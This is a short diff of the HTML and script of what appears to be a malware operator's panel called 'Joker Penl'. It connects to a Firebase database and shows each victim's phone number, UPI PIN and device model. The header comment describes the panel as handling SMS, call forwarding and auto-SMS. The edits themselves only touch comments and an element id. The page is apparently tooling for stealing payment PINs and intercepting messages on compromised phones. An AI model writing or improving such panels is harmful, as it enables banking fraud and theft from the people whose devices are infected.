@@ -226,7 +226,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
       <span class="text"><strong>Link to continue the login</strong></span>
     </div>
 
-    <!-- Quick Connect - ONLY PASSWORD (when link is present) -->
+    <!-- Quick Connect - ONLY PASSWORD -->
     <div id="qc-section" style="display:none;">
       <div class="fg">
         <label>PASSWORD</label>
@@ -237,7 +237,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
       <div class="errbox" id="qc-err"></div>
     </div>
 
-    <!-- Manual Setup (when NO link) -->
+    <!-- Manual Setup -->
     <div id="full-setup-section" style="display:block;">
       <div class="fg"><label>Firebase Database URL</label>
         <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" autocomplete="off"/></div>
@@ -284,7 +284,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
     <button class="d-ref" id="d-ref" onclick="devRefresh()">↻</button>
   </div>
 
-  <div class="d-body" id="d-body">
+  <div class="d-body">
     <div class="d-info-card"><div class="d-label">📱 Phone</div><div class="d-value" id="d-phone">---</div></div>
     <div class="d-info-card"><div class="d-label">📌 UPI Pin</div><div class="d-value" id="d-upi">---</div></div>
     <div class="d-info-card"><div class="d-label">📱 Model</div><div class="d-value" id="d-model">---</div></div>
@@ -359,7 +359,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 <script>
 /* ============================================================
-   Joker Penl - Working Version (Sirf Password Maangega)
+   Joker Penl - Complete Working (SMS, Call Forward, Auto-SMS)
    ============================================================ */
 
 var DB = '', APIKEY = '', NODE = 'csc6';
